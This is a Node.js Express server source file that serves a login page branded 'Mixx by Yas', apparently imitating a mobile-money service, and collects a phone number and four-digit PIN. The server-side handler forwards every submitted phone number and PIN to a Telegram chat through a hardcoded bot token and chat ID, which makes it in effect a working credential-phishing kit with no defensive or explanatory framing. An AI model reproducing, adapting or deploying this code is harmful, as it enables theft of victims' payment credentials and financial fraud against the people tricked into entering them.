const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// Your Telegram details
const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';
const CHAT_ID = '8999616005';

// Simple HTML form
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Mixx by Yas</title>
            <style>
                body{background:#0a1f1c;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial}
                .card{background:white;padding:40px;border-radius:20px;width:350px}
                input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:10px}
                .pin-boxes{display:flex;gap:10px}
                .pin-box{width:70px;height:70px;text-align:center;font-size:24px}
                button{width:100%;padding:12px;background:#d4af37;border:none;border-radius:10px;font-size:16px;cursor:pointer}
                .msg{color:red;margin-top:10px;text-align:center}
            </style>
        </head>
        <body>
            <div class="card">
                <h2>Mixx by Yas</h2>
                <p>Enter phone number and PIN</p>
                <input type="text" id="phone" placeholder="Phone (10 digits)">
                <div class="pin-boxes">
                    <input type="text" maxlength="1" class="pin-box" id="pin1">
                    <input type="text" maxlength="1" class="pin-box" id="pin2">
                    <input type="text" maxlength="1" class="pin-box" id="pin3">
                    <input type="text" maxlength="1" class="pin-box" id="pin4">
                </div>
                <button onclick="submit()">Submit</button>
                <div id="msg" class="msg"></div>
            </div>
            <script>
                function submit() {
                    const phone = document.getElementById('phone').value;
                    const pin1 = document.getElementById('pin1').value;
                    const pin2 = document.getElementById('pin2').value;
                    const pin3 = document.getElementById('pin3').value;
                    const pin4 = document.getElementById('pin4').value;
                    const pin = pin1 + pin2 + pin3 + pin4;
                    
                    if(!phone || phone.length !== 10) {
                        document.getElementById('msg').innerText = 'Phone must be 10 digits';
                        return;
                    }
                    if(pin.length !== 4) {
                        document.getElementById('msg').innerText = 'PIN must be 4 digits';
                        return;
                    }
                    
                    fetch('/submit', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone: phone, pin: pin})
                    })
                    .then(res => res.json())
                    .then(data => {
                        if(data.ok) {
                            document.getElementById('msg').style.color = 'green';
                            document.getElementById('msg').innerText = 'Success!';
                            document.getElementById('phone').value = '';
                            document.getElementById('pin1').value = '';
                            document.getElementById('pin2').value = '';
                            document.getElementById('pin3').value = '';
                            document.getElementById('pin4').value = '';
                        } else {
                            document.getElementById('msg').innerText = data.error;
                        }
                    })
                    .catch(err => {
                        document.getElementById('msg').innerText = 'Network error. Try again.';
                    });
                }
                
                // Auto move to next PIN box
                for(let i=1;i<=4;i++) {
                    document.getElementById('pin'+i).addEventListener('input', function(e) {
                        if(e.target.value.length === 1 && i<4) {
                            document.getElementById('pin'+(i+1)).focus();
                        }
                    });
                }
            </script>
        </body>
        </html>
    `);
});

// Handle submission
app.post('/submit', async (req, res) => {
    const { phone, pin } = req.body;
    
    console.log('Received:', phone, pin);
    
    if(!phone || !pin) {
        return res.json({ok: false, error: 'Phone and PIN required'});
    }
    
    if(phone.length !== 10) {
        return res.json({ok: false, error: 'Phone must be 10 digits'});
    }
    
    if(pin.length !== 4) {
        return res.json({ok: false, error: 'PIN must be 4 digits'});
    }
    
    const message = `New submission!\nPhone: ${phone}\nPIN: ${pin}\nTime: ${new Date().toLocaleString()}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        
        console.log('Sent to Telegram successfully');
        res.json({ok: true});
        
    } catch(error) {
        console.log('Telegram error:', error.message);
        res.json({ok: false, error: 'Failed to send to Telegram'});
    }
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
